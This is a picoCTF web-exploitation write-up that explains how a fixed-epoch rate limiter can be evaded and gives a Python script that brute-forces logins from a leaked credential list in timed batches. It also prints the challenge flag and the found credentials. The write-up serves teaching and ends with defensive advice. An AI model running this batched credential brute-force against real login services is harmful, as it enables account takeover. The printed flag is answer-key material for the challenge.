# Fool the Lockout — picoCTF Web Exploitation

> **Platform**: picoCTF
> **Category**: Web Exploitation
> **Difficulty**: Medium
> **Flag**: `picoCTF{f00l_7h4t_l1m1t3r_b56b614c}`

## Challenge Description
The goal is to bypass an IP-based rate limiter that blocks brute-force attempts after 10 failed logins within a 30-second window. We are provided with a leaked dump of 100 username/password pairs and must find the correct credentials to retrieve the flag.

## Vulnerability Analysis

The core of the issue lies in how the rate limiter (implemented in `app.py`) manages request windows. It uses a fixed epoch-based approach rather than a sliding window.

### Rate Limiter Logic
The system tracks the number of requests per IP using two main variables:
- `MAX_REQUESTS = 10`
- `EPOCH_DURATION = 30` (seconds)

Whenever a request is made, the `refresh_request_rates_db()` function checks if the current time has exceeded the epoch duration:

```python
if curr_time - epoch_start_time > EPOCH_DURATION:
    request_rates[client_ip]["num_requests"] = 0
    request_rates[client_ip]["epoch_start"] = -1
```

### The Flaw
Because the counter resets to zero at the start of every new 30-second epoch, the rate limit is not a continuous "10 requests per 30 seconds." Instead, it's "up to 10 requests within *any* 30-second block." 

By pacing our requests to stay just below the threshold (10 attempts) and then waiting for the next epoch to begin, we can effectively brute-force the login indefinitely without ever triggering the 120-second lockout.

## Exploitation Strategy

1. **Credential Parsing**: Load the 100 leaked credentials into a list.
2. **Batching**: Group the credentials into batches of 10.
3. **Timed Execution**:
   - Send one batch (10 requests) immediately.
   - Wait for 35 seconds to ensure the server-side epoch has definitely reset.
   - Repeat until a `302 Redirect` is observed, indicating a successful login.
4. **Flag Retrieval**: Once authenticated, fetch the root `/` page to capture the flag.

### Exploit Script (Conceptual)
```python
import time
import requests

BATCH_SIZE = 10
WAIT_TIME = 35  # Slightly more than 30s to be safe

def solve():
    session = requests.Session()
    # ... (loading credentials) ...

    for i in range(0, len(creds), BATCH_SIZE):
        batch = creds[i:i + BATCH_SIZE]
        for user, pwd in batch:
            resp = session.post(f"{BASE_URL}/login", 
                                data={"username": user, "password": pwd}, 
                                allow_redirects=False)
            
            if resp.status_code == 302:
                print(f"[+] Found credentials: {user}:{pwd}")
                flag_page = session.get(f"{BASE_URL}/")
                print(f"[!] Flag: {flag_page.text}")
                return

        print(f"[*] Batch finished. Waiting {WAIT_TIME}s for next epoch...")
        time.sleep(WAIT_TIME)
```

## Execution Results
In this specific case, the correct credentials (`emely:tyrant`) were located at the 8th position in the dump. This meant the challenge was solved within the very first batch, before even needing to wait for an epoch reset.

## Key Takeaways
- **Epoch vs. Sliding Window**: Fixed-window rate limiting is often bypassable if the attacker knows the window size. A sliding window (tracking the timestamp of every request) is much more robust.
- **Backpressure**: A good rate limiter should ideally increase delays rather than just providing a binary "locked/unlocked" state.
- **Boundary Conditions**: Testing the limits of a "strict greater-than" (`> 10`) check allows an attacker to maximize efficiency without crossing the line.

---

*Writeup by vibhxr*
